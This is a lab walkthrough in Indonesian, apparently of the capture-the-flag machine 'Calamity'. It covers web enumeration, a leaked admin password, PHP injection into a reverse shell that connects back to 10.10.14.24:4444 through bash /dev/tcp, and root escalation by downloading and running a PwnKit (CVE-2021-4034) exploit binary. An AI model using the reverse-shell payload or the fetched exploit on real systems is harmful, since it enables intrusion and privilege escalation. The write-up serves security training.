## **Informasi Mesin**
- **Nama**: Calamity
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: Hard
- **Alamat IP**: 10.10.10.27

## **Tahap 1: Enumerasi Awal**

### **Pemindaian Jaringan**

```bash
sudo env "PATH=$PATH" autorecon 10.10.10.27
```

**Hasil Pemindaian:**

- **Port 22**: SSH
    
- **Port 80**: HTTP
    

### **Enumerasi Web**

Akses ke port 80 menampilkan gambar dengan teks "this e-store is under development".

### **Directory Enumeration**

Menggunakan feroxbuster ditemukan halaman `admin.php`:

```bash
feroxbuster -u http://10.10.10.27/ -w /usr/share/wordlists/dirb/common.txt
```

## **Tahap 2: Eksploitasi Aplikasi Web**

### **Analisis Halaman Admin**

Halaman `admin.php` menampilkan form login.

### **Credential Discovery**

Menggunakan Burp Suite untuk menganalisis request-response, ditemukan password dalam response:

- **Username**: admin
    
- **Password**: skoupidotenekes
    

### **Akses Dashboard Admin**

Berhasil login ke dashboard admin dengan kredensial yang ditemukan.

## **Tahap 3: Eksploitasi Input Vulnerability**

### **XSS Detection**

Input box pada dashboard vulnerable terhadap XSS (Cross-Site Scripting).

### **PHP Injection**

Melalui walkthrough, ditemukan kemampuan untuk menginjeksi script PHP.

### **Reverse Shell Setup**

Membuat payload reverse shell PHP:

**Payload PHP:**

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.24/4444 0>&1'");
?>
```

**Listener:**

```bash
nc -lvnp 4444
```

## **Tahap 4: Akses User**

### **Reverse Shell Connection**

Berhasil mendapatkan reverse shell sebagai user www-data.

### **User Flag**

```bash
cat /home/user/user.txt
```

User flag berhasil diperoleh.

## **Tahap 5: Eskalasi ke Root**

### **Analisis Sistem**

Setelah mendapatkan akses user, identifikasi bahwa eskalsi root memerlukan eksploitasi buffer overflow (pwn challenge).

### **Alternative Approach - Kernel Exploit**

Karena kesulitan dengan challenge pwn, digunakan alternatif kernel exploit.

### **CVE-2021-4034 (PwnKit) Exploitation**

#### **Architecture Detection**

```bash
uname -a
arch
```

#### **Download Pre-compiled Exploit**
```bash
wget https://github.com/c3c/CVE-2021-4034/releases/download/0.2/cve-2021-4034
```

#### **Execution**

```bash
chmod +x cve-2021-4034
./cve-2021-4034
```

### **Root Access**

Berhasil mendapatkan akses root melalui kernel exploit.

### **Root Flag**

```bash
cat /root/root.txt
```

Root flag berhasil diperoleh.